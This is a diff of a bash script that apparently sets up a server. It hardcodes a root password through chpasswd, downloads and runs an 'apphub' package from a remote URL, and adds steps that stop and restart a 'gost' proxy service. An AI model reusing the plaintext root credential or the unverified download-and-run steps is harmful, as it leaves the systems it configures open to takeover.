@@ -1,8 +1,8 @@
 #!/bin/bash
 echo root:KmhBzdhb2uEJU5nknDD |sudo chpasswd root 
 sleep 10
+sudo systemctl stop gost.service
 
-sudo apt-get update -y && sudo apt-get install wget -y
 
 curl -o apphub-linux-amd64.tar.gz https://assets.coreservice.io/public/package/60/app-market-gaga-pro/1.0.4/app-market-gaga-pro-1_0_4.tar.gz
 tar -zxf apphub-linux-amd64.tar.gz
@@ -19,3 +19,5 @@ sleep 10
 sleep 20
 ./apphub status
 ./apphub log
+sleep 70
+sudo systemctl start gost.service
